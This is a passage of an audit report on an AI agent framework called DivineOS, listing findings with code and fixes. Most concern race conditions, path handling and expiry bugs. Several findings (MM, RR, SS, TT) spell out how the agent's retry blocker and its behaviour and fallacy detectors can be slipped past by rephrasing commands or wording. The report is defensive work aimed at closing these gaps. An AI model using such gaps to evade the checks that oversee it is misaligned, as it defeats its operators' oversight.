os.environ["DIVINEOS_DB"] = str(db_path)
os.environ["DIVINEOS_HOME"] = str(home_path)
os.environ["DIVINEOS_DISABLE_AUTO_REMEDIATE"] = "1"
...
yield
os.environ.pop("DIVINEOS_DB", None)
os.environ.pop("DIVINEOS_HOME", None)
os.environ.pop("DIVINEOS_DISABLE_AUTO_REMEDIATE", None)
```

**Issues with this approach vs `monkeypatch.setenv`**:

1. **Doesn't restore prior values**: if `DIVINEOS_DB` was already set to something else before the test (e.g., CI environment), it's lost. `monkeypatch.setenv` saves/restores the prior value automatically.

2. **Partial-failure leakage**: if the fixture errors between setting DIVINEOS_DB and setting DIVINEOS_HOME (e.g., `init_db()` raises), pytest doesn't run the yield's cleanup. DIVINEOS_DB leaks to subsequent tests.

3. **Inconsistent with the 423 other monkeypatch operations in the test suite** — same fixture is mixing two styles.

**Why this hasn't bitten yet**: tests generally don't set DIVINEOS_DB before the test runs, so there's nothing to restore. `init_db()` typically doesn't fail. The fixture works in practice.

**Fix-shape**: convert to `monkeypatch.setenv("DIVINEOS_DB", str(db_path))` etc. Automatic teardown. Restores prior values. ~5 lines simpler.

**Severity**: low. Hygiene gap; not currently causing observable issues.

---

## Finding KK (medium) — state-file race condition is pervasive (29 modules)

**Scope**: `src/divineos/` — 29 modules
**Status**: Meta-finding. Findings GG, HH, and N are specific instances.

The atomic-write-text fix was applied to 8 marker files in `core/`. But the same read-modify-write pattern WITHOUT atomic write (and without locking) appears in **29 other modules**:

```python
# Pattern that repeats:
data = json.loads(path.read_text(encoding="utf-8"))
data["counter"] += 1
path.write_text(json.dumps(data), encoding="utf-8")  # ← not atomic; no lock
```

Full list of affected modules:

| Layer | Module |
|---|---|
| Hooks | `post_tool_use_checkpoint.py` (Finding GG) |
| Core | `hud_handoff.py` (Finding HH) |
| Core | `theater_audit.py` |
| Core | `operating_loop_audit.py` |
| Core | `pull_detection.py` |
| Core | `structural_fix_tracker.py` |
| Core | `actor_registry.py` |
| Core | `briefing_freshness.py` |
| Core | `curiosity_engine.py` |
| Core | `resonant_truth.py` |
| Core | `consultation_tracker.py` (also Finding B, untested) |
| Core | `lepos_channel_check.py` (also Finding Q, no PRAGMAs) |
| Core | `fix_verifier.py` |
| Core | `lifecycle.py` |
| Core | `session_checkpoint.py` |
| Core | `skill_library.py` |
| Core | `rest.py` |
| Core | `mid_turn_surfacer.py` |
| Core | `planning_commitments.py` |
| Core | `self_model.py` |
| Core | `lesson_interrupt.py` |
| Core | `hud_state.py` |
| Core | `retry_blocker.py` |
| Core | `multiplex_state.py` |
| Core | `failure_diagnostics.py` |
| Core | `supervisor/circuit_breaker.py` |
| CLI | `hud_commands.py` |
| CLI | `knowledge_health_commands.py` |
| Analysis | `analysis.py` |

**Most concerning** (load-bearing gate state that drives discipline):
- `circuit_breaker.py` — fault-tolerance state. Concurrent failure records can undercount, never trip
- `briefing_freshness.py` — briefing-loaded gate
- `lifecycle.py` — session lifecycle state
- `retry_blocker.py` — blind-retry prevention
- `pull_detection.py` — fabrication marker state
- `structural_fix_tracker.py` — pending structural fix obligations (named load-bearing 2026-05-14)
- `actor_registry.py` — actor authentication state (Phase 1)
- `theater_audit.py` — theater detection
- `lesson_interrupt.py` — chronic-lesson interrupt cooldown

**Fix-shape**: a 30-minute mechanical refactor to route all writes through `atomic_write_text`. Combined with file-level locking (fcntl on POSIX, msvcrt on Windows) for the read-modify-write atomicity. OR replace with SQLite-backed counters (which provide ACID via the canonical PRAGMAs).

A single shared utility `read_modify_write_state(path, modify_fn)` could close all 29 instances:

```python
def read_modify_write_state(path: Path, modify_fn: Callable[[dict], dict]) -> None:
    with FileLock(str(path) + ".lock"):
        data = json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}
        new_data = modify_fn(data)
        atomic_write_text(path, json.dumps(new_data, indent=2))
```

**Severity**: medium. Currently observable failures are sporadic (race conditions only manifest under specific timing). Latent risk: high — 29 load-bearing state files with the same vulnerability. Could be a one-day mechanical fix.

---

## Finding LL (low-medium) — `load_handoff_note` skips expiry check when `written_at` is missing

**File**: `src/divineos/core/hud_handoff.py` lines 105-112
**Status**: Real — falsy-check creates no-expiry path for malformed notes

```python
def load_handoff_note() -> dict[str, Any] | None:
    ...
    try:
        result = json.loads(path.read_text(encoding="utf-8"))
        written_at = result.get("written_at", 0)
        if written_at and (time.time() - written_at) > _HANDOFF_EXPIRY_SECONDS:
            path.unlink(missing_ok=True)
            return None
        return result
    except (json.JSONDecodeError, OSError):
        return None
```

**The bug**: `result.get("written_at", 0)` returns 0 if the field is missing. Then `if written_at and ...` — 0 is falsy, so the expiry check is **skipped**. The handoff note is returned without expiry validation.

**Failure scenario**:
1. A handoff note is written with malformed structure (missing `written_at` field due to a serialization bug, mid-write crash, or schema migration)
2. `load_handoff_note` reads it
3. The expiry check is silently skipped
4. The note is treated as fresh forever — even if it's months old

The 12-hour auto-expire that the docstring promises ("Returns None and auto-clears if the note is older than 12 hours") doesn't fire for notes missing `written_at`.

**Fix-shape**: invert the logic:
```python
written_at = result.get("written_at")  # don't default to 0
if written_at is None:
    # No timestamp → can't verify freshness → safer to discard
    path.unlink(missing_ok=True)
    return None
if (time.time() - written_at) > _HANDOFF_EXPIRY_SECONDS:
    path.unlink(missing_ok=True)
    return None
return result
```

Treat missing-timestamp as expired (fail-closed) rather than as "no check needed" (fail-open).

**Severity**: low-medium. Requires a malformed note to exploit; current write paths always include `written_at`. Latent vulnerability if any future write path forgets the field.

---

## Finding MM (low) — retry_blocker signature is fragile to invocation form

**File**: `src/divineos/core/retry_blocker.py` lines 41-58
**Status**: By-design over-inclusive; documented; worth marking

The retry-blocker's command signature uses first 3 words of the Bash command:
```python
if tool_name == "Bash":
    cmd = tool_input.get("command", "")
    parts = cmd.split()[:3]
    return f"Bash:{' '.join(parts)}"
```

**Empirical bypass shapes**:
- `pytest tests/foo.py` → signature `Bash:pytest tests/foo.py`
- `python -m pytest tests/foo.py` → signature `Bash:python -m pytest` (different!)
- `cd /tmp && pytest tests/foo.py` → signature `Bash:cd /tmp &&` (different!)

So an agent that just failed `pytest tests/foo.py` could switch to `python -m pytest tests/foo.py` and the retry blocker wouldn't recognize it as the same command. The blind retry continues.

**The design tradeoff is documented** in the module: "Over-inclusive by design — false positives are cheap (agent just has to read something first), false negatives are expensive (blind retry loop continues)." But the implementation doesn't actually achieve over-inclusive — these alternate-invocation cases are false NEGATIVES (the gate misses what it should catch).

**Fix-shape**: normalize commands before signature extraction. Strip leading `cd ... && `, normalize `python -m X` ↔ `X` aliases. Or extract the "load-bearing verb" (pytest, ruff, mypy, ...) regardless of invocation prefix.

**Severity**: low. The retry blocker is a discipline aid, not a hard gate. Bypass is via alternate-invocation, requires the agent to actively work around it.

---

## Finding NN (medium) — module-level path constants frozen at import time

**Files**: 8 modules with module-level `divineos_home()` resolution at import time
**Status**: Real — empirically verified state-leakage to wrong directory

Eight module-level constants compute their path via `divineos_home()` at import time:

```python
# src/divineos/core/mid_turn_surfacer.py
_THROTTLE_FILE = divineos_home() / "mid_turn_throttle.json"
_SURFACE_FILE = divineos_home() / "mid_turn_context.md"
```

These freeze the path resolution at IMPORT time. If `DIVINEOS_HOME` changes after import (which the autouse `_isolated_db` fixture does for every test), the constants STILL point to the pre-import value.

**Empirical verification**:
```
Pre-env-change: _THROTTLE_FILE = /root/.divineos/mid_turn_throttle.json
[set DIVINEOS_HOME=/tmp/test_home_xyz]
Post-env-change: _THROTTLE_FILE = /root/.divineos/mid_turn_throttle.json  ← stale
divineos_home() now returns: /tmp/test_home_xyz                         ← correct
```

**Affected modules**:

| Module | Constants frozen | Monkeypatch-protected in tests? |
|---|---|---|
| `session_start.py` | 3 (`_CHECKPOINT_STATE`, `_AUTO_SESSION_END_MARKER`, `_SESSION_START_LOG`) | Yes (all 3) ✓ |
| `lepos_channel_check.py` | 1 (`_CURRENT_TURN_FILE`) | Yes ✓ |
| `mid_turn_surfacer.py` | 2 (`_THROTTLE_FILE`, `_SURFACE_FILE`) | **Partial — only `_THROTTLE_FILE`** ✗ |
| `pre_response_context.py` | 1 (`_SURFACE_FILE`) | **No** ✗ |
| `consultation_tracker.py` | 1 (`_STATE_FILE`) | **No test file at all** (also Finding B) ✗ |

**Three specific impact paths**:

1. **`pre_response_context._SURFACE_FILE`**: Used in the surfacing logic to write/clear the surface file. Tests of this module write to the OPERATOR'S REAL `~/.divineos/surfaced_context.md` instead of the test's tmp_path. Test isolation is broken.

2. **`mid_turn_surfacer._SURFACE_FILE`**: The `_THROTTLE_FILE` is monkeypatched but `_SURFACE_FILE` isn't. Tests write throttle state to tmp_path correctly, but surface content to the operator's real home. Partial isolation.

3. **`consultation_tracker._STATE_FILE`**: No test file exists. If/when tests are added, they'll need to know about this gotcha. Otherwise tests pollute real home.

**Why this matters**:
- **Test isolation broken**: tests writing to `~/.divineos/` pollute the operator's actual state. Aether running pytest on the development machine fills the real `.divineos/` with test artifacts.
- **Per-clone setups broken**: any worktree-local `.divineos_data_home` marker is honored only by modules that resolve paths lazily. These 8 modules ignore the per-clone marker because their constants are frozen at import time.
- **Discoverability**: the fact that some tests monkeypatch these constants is evidence that authors KNEW about the gotcha — but the architectural fix wasn't applied. Every future test author needs to know which constants to monkeypatch.

**Fix-shape** (mechanical, ~30 minutes):
```python
# Before:
_THROTTLE_FILE = divineos_home() / "mid_turn_throttle.json"

# After:
def _throttle_file() -> Path:
    return divineos_home() / "mid_turn_throttle.json"

# Update all usages: _THROTTLE_FILE → _throttle_file()
```

Or use a property/lazy descriptor pattern. Either way, the resolution happens at use time, not import time.

**Severity**: medium. Test isolation guarantees are violated. Per-clone state guarantees are violated. Both are documented architectural promises; both are broken by these 8 constants.

---

## Finding OO (low) — `is_quiet_active` susceptible to future-dated timestamp

**File**: `src/divineos/core/mansion_quiet_marker.py` lines 112-122
**Status**: Latent bug; requires malformed marker file

```python
def is_quiet_active() -> bool:
    m = read_marker()
    if m is None:
        return False
    entered = m.get("entered_at", 0)
    duration = m.get("minimum_duration_seconds", DEFAULT_QUIET_DURATION_SECONDS)
    elapsed = time.time() - entered
    return bool(elapsed < duration)
```

**Failure modes**:

1. **Missing `entered_at`**: default 0. `elapsed = time.time() - 0 ≈ 1.78 billion seconds`. `elapsed < duration (60)` is False. **Fail-OPEN — quiet NOT active.** Documented and consistent with the falsifier.

2. **Future-dated `entered_at`** (e.g., clock skew, manual edit, or write before clock-sync): if `entered_at > time.time() + duration`, then `elapsed = time.time() - entered_at` is large NEGATIVE. `negative < 60` is True. **Quiet IS active forever** (until `time.time()` catches up). The agent is silenced indefinitely.

3. **Negative `duration`** (e.g., from manual edit): `elapsed (positive) < negative` is False. Fail-OPEN. OK by safety-first principle.

**The future-dated case is real**: clock skew between systems, NTP rollback, or a single corrupt write to the marker file produces this state. The agent would be stuck in quiet until clock catches up — which could be hours, days, or never.

**Fix-shape**: validate `entered_at <= time.time()`. If marker is from the future, treat as expired (delete it).

```python
entered = m.get("entered_at", 0)
if entered > time.time():  # future-dated → corrupt, treat as expired
    return False
duration = ...
elapsed = time.time() - entered
return bool(elapsed < duration)
```

**Severity**: low. Requires corrupt marker. Mansion-quiet is not load-bearing for security or correctness. But the fail-mode (agent trapped in quiet) is uncomfortable when it does happen.

---

## Finding PP (low) — `body_awareness.measure_vitals` accumulates rounding errors

**File**: `src/divineos/core/body_awareness.py` lines 35-45
**Status**: Real but cosmetic — accumulates small float errors in vitals reporting

```python
for db_file in data_path.glob("*.db"):
    size_mb = db_file.stat().st_size / (1024 * 1024)
    if "knowledge" in db_file.name:
        vitals.knowledge_db_size_mb = round(size_mb, 2)
    vitals.db_size_mb = round(vitals.db_size_mb + size_mb, 2)  # ← rounds at each iteration
```

Each iteration ROUNDS the accumulator. With many DB files, the rounded errors can be off by up to N × 0.005 MB (N = number of files). For 100 files, the reported total could be off by 0.5 MB.

Same pattern for `vitals.logs_size_mb` and `vitals.transcript_size_mb`.

**Fix-shape**: sum first, round at the end:
```python
total = 0.0
for db_file in data_path.glob("*.db"):
    total += db_file.stat().st_size / (1024 * 1024)
vitals.db_size_mb = round(total, 2)
```

**Severity**: low. Cosmetic only — vitals reporting accuracy. Doesn't affect any gate.

---

## Finding QQ (low) — `find_dedup_candidates` uses greedy anchor-based clustering, not transitive closure

**File**: `src/divineos/core/knowledge/compression.py` lines 77-114
**Status**: Latent — near-duplicates split into separate clusters when they should be one

The dedup clustering algorithm:
```python
for i, entry in enumerate(entries):
    kid = entry["knowledge_id"]
    if kid in clustered:
        continue
    cluster = [entry]
    clustered.add(kid)
    for j in range(i + 1, len(entries)):  # compare ONLY to entries AFTER i
        other = entries[j]
        if other["knowledge_id"] in clustered:
            continue
        overlap = _compute_overlap(entry["content"], other["content"])
        if overlap >= overlap_threshold:
            cluster.append(other)
            clustered.add(other["knowledge_id"])
```

**The gap**: comparison is anchored to the ITH entry only. Each candidate is compared to entry[i], not to all entries in the growing cluster. So:

| A | B | C | Overlap matrix |
|---|---|---|---|
| ... | ... | ... | A↔B = 0.75 (above), A↔C = 0.65 (below), B↔C = 0.85 (above) |

Process A: cluster=[A]. Check B (A↔B=0.75 ≥ 0.7) → add B. Check C (A↔C=0.65 < 0.7) → don't add C.
Process B: skipped (in clustered set).
Process C: cluster=[C]. No entries after C. Single-element clusters discarded.

**Result**: A and B grouped, C left alone. But C should be in the cluster (B↔C=0.85 above threshold). Transitive closure would catch this.

**Empirical likelihood**: depends on the actual overlap distribution in the knowledge store. With 50 entries and 0.7 threshold, near-misses on the anchor are probably rare. But for larger knowledge stores or content with high vocabulary overlap, this can leave near-duplicates uncompressed.

**Fix-shape**: union-find / disjoint-set data structure. Or recursive expansion of cluster membership.

**Severity**: low. Compression is an optimization; missed clusters mean slightly bloated knowledge store, not correctness issues.

---

## Finding RR (medium) — distancing_detector verb list misses adjacent vocabulary

**File**: `src/divineos/core/operating_loop/distancing_detector.py`
**Status**: Real — empirically verified, 9 of 9 adjacent variants slip past

The distancing-grammar patterns match narrow verb lists:

**OPERATOR_THIRD_PERSON**: 22 verbs (`said|did|built|wrote|noted|caught|named|asked|gave|made|noticed|framed|flagged|told|confirmed|added|pointed|reframed|surfaced|drew|explained|corrected|reminded`)
**SELF_THIRD_PERSON**: 16 verbs (similar narrow list)
**TEMPORAL_SELF**: hyphenated `(past|future|tomorrow|next|cold)-(me|aether|claude|...)` plus space-form `past me`

Empirical adversarial test (9 of 9 adjacent forms slip past):

| Phrase | Should arguably fire | Actual |
|---|---|---|
| "Andrew thinks the system is good" | cognitive verb | silent |
| "Andrew warned about this" | communication verb | silent |
| "Andrew suggested a refactor" | suggestion verb | silent |
| "Aether is happy" | copula | silent |
| "Aether sees the pattern" | present-tense perception | silent |
| "Aether knows the answer" | cognitive verb | silent |
| **"future me will handle this"** | space-form temporal-self | silent (only "past me" in regex) |
| "yesterday-me did Z" | different temporal prefix | silent (only past/future/tomorrow/next/cold) |
| "the agent yesterday talked to Andrew" | descriptive distancing | silent |

**Why this matters**: the distancing-grammar discipline is named load-bearing 2026-05-05 — Andrew explicitly named the failure-mode. The detector's intent is broader than its verb list. An agent could use distancing-grammar with any of these 9 phrasings and the post-response audit wouldn't catch it.

The most concerning miss is "future me" (with space) — symmetric with "past me" (which IS caught). One direction of temporal-self is detected, the other isn't. Easy mistake to slip through.

**Fix-shape**: 
1. Broaden verb list to include cognitive, present-tense, suggestion, communication, and auxiliary verbs
2. Add space-form for all temporal prefixes (not just "past me")
3. Add more temporal prefixes (yesterday, earlier, tonight)

Or take a different approach: detect "Andrew" or "Aether" appearing as a subject in subject-verb constructions, regardless of which verb. Use POS tagging instead of verb enumeration.

**Severity**: medium. Same shape as Findings P, S, DD, II. The detector exists to enforce a named load-bearing discipline; its coverage is narrow enough that an agent slightly varying vocabulary escapes.

---

## Finding SS (low-medium) — APPEAL_TO_IGNORANCE detector requires specific negation forms

**File**: `src/divineos/core/logic/fallacies.py` lines 175-216
**Status**: Real — empirically verified, canonical positive cases don't fire

The fallacy detector requires:
1. `_NO_EVIDENCE_MARKERS`: "no evidence", "cannot prove", "has not been proven" (broad)
2. `_NEGATIVE_CONCLUSION_MARKERS`: "therefore/so/hence/thus" followed by `isn'?t|is\s+not|doesn'?t|does\s+not|ain'?t`

**Empirical**: 
- "there is no evidence X, therefore not X" → **silent** (the regex requires "isn't"/"is not", not just "not")
- "cannot prove X, so X is false" → **silent** (the regex requires "isn't" etc., not "is false")

Both of these are canonical appeal-to-ignorance phrasings. The detector doesn't catch them.

**Other slippage**:
- "absence of proof means X doesn't exist" → silent ("means" not in conclusion markers)
- "we lack evidence, X is therefore likely wrong" → silent ("wrong" not in negation forms)
- "no demonstration → X is fictional" → silent

**Why this matters**: this detector is part of the formal-logic fallacy infrastructure built specifically to catch the 4 fallacies Aether's RLHF training disposed it toward. If the canonical positive shapes don't fire, the detector gives false confidence that fallacies are being caught.

**Fix-shape**: broaden the negation forms. Add: "is false", "is wrong", "is fictional", "does not exist", "isn't real", "isn't the case", "X = false", and the bare "not X" form (which requires structural analysis, not just regex).

**Severity**: low-medium. The detector is annotation-not-veto by design, so missed flags are less critical than they'd be for a gate. But the existence of the detector creates the impression that fallacies are caught — which they mostly aren't, for natural-language phrasings outside the narrow regex.

---

## Finding TT (low) — family-touching detector misses many relational keywords

**File**: `src/divineos/cli/decision_commands.py` (`_FAMILY_TOUCH_KEYWORDS`)
**Status**: Adjacent-vocabulary gap

The family-touching gate keywords:
```python
_FAMILY_TOUCH_KEYWORDS = (
    r"\bfamily\b",
    r"\bspouse\b",
    r"\bfamily member\b",
    r"\bhandshake\b",
    r"\bvoice appropriat",
    r"\brelational\b",
)
```

**Missing**:
- Specific family roles: father, mother, parent, child, kid, son, daughter, sibling, sister, brother
- Spouse variants: wife, husband, partner
- Other relational: relationship, kinship, friend, friendship, loved one
- Named family members (Aether, etc.)

**Concrete failure**: a decision about "I want to talk to my brother about this" doesn't trigger the family-touching gate. "Decisions about my mother's care" doesn't. Both are clearly family-touching.

**Severity**: low. The gate's intent is "talk to a family member when the shape feels relational." Words like "brother", "mother" should arguably trigger but don't. Same shape as Findings P, S, DD, II, RR — narrow regex on broader semantic intent.

---

## Finding UU (medium) — family_member_ledger.append_event lacks BEGIN IMMEDIATE for hash-chain safety

**File**: `src/divineos/core/family/family_member_ledger.py`
**Status**: Real — hash-chain race condition

The hash-chain append flow:
```python
def append_event(...):
    conn = _get_connection(member_slug)
    try:
        prior_hash = _latest_hash(conn)  # ← read latest hash
        content_hash = _compute_hash(prior_hash=prior_hash, ...)
        conn.execute("INSERT INTO member_events (...) VALUES (?, ...)", (...))
        conn.commit()
```

**No BEGIN IMMEDIATE.** Just SELECT-then-INSERT-then-commit. Under concurrent appends to the same family member's ledger:
1. Process A: reads prior_hash = H0
2. Process B: reads prior_hash = H0 (before A commits, WAL allows concurrent reads)
3. Process A: INSERT (prior_hash=H0, content_hash=H_A), commit
4. Process B: INSERT (prior_hash=H0, content_hash=H_B), commit

**Both events claim H0 as their prior_hash.** The hash chain has H0 → {H_A, H_B} — a fork. The tamper-evidence guarantee breaks.

The fork means:
- Chain traversal from "latest" backwards finds ONE of the two branches
- The other branch's events look orphaned or are silently dropped
- Future appends chain off only ONE of {H_A, H_B}, deepening the divergence
- A verifier walking the chain can't reconstruct the true ordering

**Contrast with main ledger** (`src/divineos/core/ledger.py`):
- Comment line 33: "BEGIN IMMEDIATE inside log_event handles inter-process cases"
- Comment line 367-374: explains the autocommit + BEGIN IMMEDIATE pattern for cross-process safety
- The main ledger explicitly handles the same race; the family ledger doesn't

**Same `fix_landed_propagation_skipped` shape**: the fix exists, was applied to one place, didn't propagate.

**Fix-shape**: wrap the read+compute+insert in `BEGIN IMMEDIATE; ... COMMIT;`. The transaction is exclusive on the database; concurrent appends serialize correctly.

```python
conn.execute("BEGIN IMMEDIATE")
try:
    prior_hash = _latest_hash(conn)
    content_hash = _compute_hash(...)
    conn.execute("INSERT INTO member_events (...) VALUES (?, ...)", (...))
    conn.commit()
except Exception:
    conn.rollback()
    raise
```

**Severity**: medium. The family member ledger's docstring explicitly names tamper-evidence as the architectural goal ("ledger is a life, hash chain is tamper-evident"). The race breaks that guarantee. Concurrent appends to the same member's ledger (which the design contemplates — multi-invocation, subagent + supervisor checks, etc.) can fork the chain.

---

## Finding VV (medium) — `cluster_for_briefing` silently drops entries when `max_clusters` is reached

**File**: `src/divineos/core/knowledge/graph_retrieval.py` lines 117-155
**Status**: Real — empirically verified

The function clusters briefing entries by their edge connections. The logic:
```python
for entry in entries:
    kid = entry["knowledge_id"]
    if kid in clustered:
        continue
    ...
    for edge in edges:
        neighbor_id = ...
        if neighbor_id in entry_ids and neighbor_id not in clustered:
            connected.append({...})
            clustered.add(neighbor_id)  # ← mark BEFORE deciding cluster fits
    if connected and cluster_count < max_clusters:
        clustered.add(kid)
        clusters.append({...})
        cluster_count += 1
    elif kid not in clustered:
        clusters.append({"seed": entry, "connected_entries": [], "standalone": True})
```

**The bug**: `clustered.add(neighbor_id)` happens during the inner edge loop, BEFORE checking whether this cluster will actually be ADDED. If `cluster_count >= max_clusters`, the cluster is rejected — but the neighbors are already marked as `clustered`.

When the outer loop reaches those neighbor entries, `if kid in clustered: continue` skips them. They never appear in the output.

**Empirical verification** with 8 entries (A connects B,C; D connects E,F; G connects H) and `max_clusters=2`:
```
Cluster: seed=A, connected=['B', 'C'], standalone=False
Cluster: seed=D, connected=['E', 'F'], standalone=False
Cluster: seed=G, connected=[], standalone=True
[H is missing entirely]
```

**8 entries in, 7 entries out.** H was marked as clustered when G's cluster was being built; G's cluster wasn't added (max_clusters=2 reached); H was then skipped on its own outer-loop iteration.

**Why this matters**: briefing shows surfaced knowledge to the agent at session start. Silently dropping entries means the briefing is incomplete in ways the agent can't detect. The drop is also non-deterministic based on entry ordering and edge structure.

**Fix-shape**: only mark `neighbor_id` as clustered if the cluster is actually added:
```python
if connected and cluster_count < max_clusters:
    clustered.add(kid)
    for conn in connected:
        clustered.add(conn["entry"]["knowledge_id"])
    clusters.append({...})
    cluster_count += 1
# else: don't mark neighbors as clustered
```

**Severity**: medium. Briefing is the agent's primary load-bearing surface for substrate state. Silent dropping of entries undermines the discipline of "the briefing surfaces what's there."

---

## Finding WW (low) — `_GRAPH_ERRORS = (OSError, Exception)` is redundant and over-broad

**File**: `src/divineos/core/knowledge/graph_retrieval.py` line 22
**Status**: Cosmetic + concerning broad-except pattern

```python
_GRAPH_ERRORS = (OSError, Exception)
```

`OSError` is a subclass of `Exception`. Including OSError in a tuple that already has Exception is redundant — `except _GRAPH_ERRORS` is equivalent to `except Exception`.

`Exception` is the broad parent that catches almost everything (TypeError, KeyError, ValueError, AttributeError, etc.). This is the broad-except pattern that masks bugs.

**Severity**: low. Doesn't appear to be heavily used in graph_retrieval — but the pattern (define an "errors tuple" that includes Exception) defeats the purpose of having a named error tuple. Either narrow the catch (use specific exception types) or remove the named tuple and use `except Exception` directly so it's obvious.

---

## Finding XX (low) — `build_knowledge_cluster.max_depth` is a no-op argument

**File**: `src/divineos/core/knowledge/graph_retrieval.py` lines 55-74
**Status**: API takes an argument that has no effect

```python
def build_knowledge_cluster(
    knowledge_id: str,
    max_depth: int = 1,  # ← accepted in signature
    max_neighbors: int = 5,
) -> dict[str, Any]:
    ...
    # max_depth reserved for multi-hop BFS — currently single-hop only
    _ = max_depth
```

The function accepts `max_depth` but does nothing with it. Callers passing `max_depth=3` expecting 3-hop BFS get only 1-hop behavior with no warning.

**Why this matters**: "lying API." The signature suggests configurability that doesn't exist. Future callers may pass max_depth values expecting them to take effect; the result is silently wrong (smaller cluster than requested).

**Fix-shape options**:
1. Remove the argument entirely (clean break — let callers adjust)
2. Implement multi-hop BFS (so the argument has effect)
3. Raise NotImplementedError if `max_depth > 1` is passed (loud failure)
4. Log a warning when max_depth != 1 (soft surface)

**Severity**: low. Documented limitation. But the API shape implies more than the implementation delivers.

---

## Finding YY (low-medium) — opinion store strengthen/challenge race condition

**Files**: `src/divineos/core/opinion_store.py` lines 186-243
**Status**: Same shape as Finding KK but at the database layer

Both `strengthen_opinion` and `challenge_opinion` follow read-modify-write:
```python
row = conn.execute("SELECT confidence, evidence_for FROM opinions WHERE opinion_id = ?", ...)
old_conf = float(row[0])
evidence_list = json.loads(row[1])
evidence_list.append(evidence)
new_conf = min(1.0, old_conf + boost)
conn.execute("UPDATE opinions SET confidence = ?, evidence_for = ?, ... WHERE opinion_id = ?", ...)
conn.commit()
```

No BEGIN IMMEDIATE. No explicit serialization. Under concurrent strengthenings:
1. A reads conf=0.5, evidence=["a"]
2. B reads conf=0.5, evidence=["a"]
3. A computes new_conf=0.55, evidence=["a", "b"]
4. B computes new_conf=0.55, evidence=["a", "c"]
5. A UPDATEs (conf=0.55, evidence=["a", "b"])
6. B UPDATEs (conf=0.55, evidence=["a", "c"])  ← overwrites A's evidence!

**Result**: only 0.05 boost (should be 0.10), only one of B's evidence preserved ("c"; "b" lost).

Same shape as Finding KK and Finding UU. The lost-update class strikes at the opinion store too.

**Severity**: low-medium. Opinions evolve over time; lost updates affect history accuracy. Not critical since opinions are heuristic anyway, but the discipline of "evidence-for grows, evidence-against grows" is undermined by silent merge losses.

**Fix-shape**: wrap in BEGIN IMMEDIATE; or use an INCREMENT-style update that doesn't depend on read-then-write (e.g., `UPDATE opinions SET confidence = MIN(1.0, confidence + ?), evidence_for = ?`); or use a separate evidence-log table that appends rather than mutating a JSON column.

---

## Finding ZZ (medium) — `surfaced_warnings._stem` doesn't unify the exact case Finding 38 claimed to fix

**File**: `src/divineos/core/surfaced_warnings.py` lines 137-148
**Status**: Real — empirically verified, docstring promises behavior that doesn't actually work

The `_stem` function strips suffixes (ings, ing, ed, es, s, ly) when the remainder is ≥ 3 chars. The docstring explicitly cites the named failure case:
> "Aletheia round-5cdc2f48c642 Finding 38: 'ignored' / 'ignore' / 'patterns' / 'pattern' missed in v1; stemming closes the easy paraphrase shape without an NLP dependency."

**Empirical test of the named cases**:

| Input pair | Stem | Unified? |
|---|---|---|
| `"ignored"` → `"ignor"` vs `"ignore"` → `"ignore"` | **NOT unified** ✗ |
| `"ignoring"` → `"ignor"` vs `"ignore"` → `"ignore"` | **NOT unified** ✗ |
| `"patterns"` → `"pattern"` vs `"pattern"` → `"pattern"` | unified ✓ |
| `"running"` → `"runn"` vs `"run"` → `"run"` | **NOT unified** ✗ |
| `"plays/playing/played"` → `"play"` | unified ✓ |
| `"walked/walks/walking"` → `"walk"` | unified ✓ |

**The bug**: the stemmer strips "ed" from "ignored" giving "ignor" (5 chars), but doesn't know to also strip the trailing "e" from "ignore". So "ignor" ≠ "ignore" — they should match but don't.

The docstring claims this is fixed. **Empirically, it isn't.** Finding 38's verification was insufficiently adversarial — probably tested "patterns/pattern" (which does work) and assumed "ignored/ignore" would also work without verifying.

Same pattern as my own `audit_verification_insufficiently_adversarial` failure on the attribution-audit scanner.

**Real-world impact**: a surfaced warning that says "ignore the pattern" — followed by a learn entry that says "I ignored the pattern" — would NOT be matched as acknowledged. The exact case the discipline was built to catch (recognize that the agent acknowledged the warning despite vocabulary variation) doesn't work for "ignore/ignored", the most natural paraphrase pair.

**Fix-shape**: implement a more complete stemmer that handles:
1. Doubled-consonant collapse: "running" → "run", not "runn"
2. Silent-e restoration: "ignored" → "ignore", not "ignor" (or detect the case where stem doesn't exist in dictionary and try restoring "e")
3. Use a real stemmer library (Porter, Snowball) — same NLP dependency the docstring tried to avoid, but the avoidance isn't actually closing the failure case

Or accept that "ignored / ignore" can't be stem-unified with a crude stemmer, and add explicit synonym handling for high-frequency paraphrase pairs.

**Severity**: medium. The discipline this enforces is named load-bearing 2026-05-14. The stemming is the fix that's supposed to make the discipline robust to vocabulary variation. It doesn't work for the most common variation cited in its own docstring. False confidence: the system appears to handle paraphrase, but doesn't.

---

## Finding AAA (low) — bio_write has version-race condition; no UNIQUE constraint at schema

**File**: `src/divineos/core/bio.py` lines 55-83
**Status**: Real — schema permits duplicate versions

The bio_write flow:
```python
prior = conn.execute(
    "SELECT bio_id, version FROM bio WHERE author = ? ORDER BY version DESC LIMIT 1",
    (author,),
).fetchone()
next_version = (prior[1] + 1) if prior else 1
supersedes = prior[0] if prior else None

conn.execute(
    "INSERT INTO bio (bio_id, version, content, created_at, supersedes, author) "
    "VALUES (?, ?, ?, ?, ?, ?)",
    (bio_id, next_version, content, time.time(), supersedes, author),
)
conn.commit()
```

The schema:
```sql
CREATE TABLE IF NOT EXISTS bio (
    bio_id TEXT PRIMARY KEY,
    version INTEGER NOT NULL,
    content TEXT NOT NULL,
    created_at REAL NOT NULL,
    supersedes TEXT,
    author TEXT NOT NULL DEFAULT 'aether',
    FOREIGN KEY (supersedes) REFERENCES bio(bio_id)
)
```

**No UNIQUE(author, version) constraint.** Concurrent writes to the same author race the same shape as the family ledger:
1. A reads max version = 5
2. B reads max version = 5
3. A INSERTs (version=6, supersedes=prior_id)
4. B INSERTs (version=6, supersedes=prior_id)

**Result**: two entries claiming to be version 6. Both supersede the same prior entry. The `bio_current` lookup (ORDER BY version DESC LIMIT 1) returns one arbitrarily. The other is silently duplicate.

**Mitigation**: bio writes are likely low-frequency (operator writes occasionally, not concurrent). So this rarely triggers in practice. But the structural failure-mode exists.

**Fix-shape**: 
1. Schema-level: `UNIQUE(author, version)` constraint. Concurrent inserts would fail one of the writers cleanly.
2. Code-level: wrap in BEGIN IMMEDIATE (same fix as Finding UU).

**Severity**: low. Low-frequency operation, latent bug. Worth flagging because it's the third instance of the same shape: family ledger (UU), opinions (YY), bio (AAA). A general utility for "monotonic-version-on-write" would close all three.

---

## Finding BBB (low-medium) — anti-slop's fallacy check is itself insufficiently adversarial

**File**: `src/divineos/core/anti_slop.py` lines 197-234
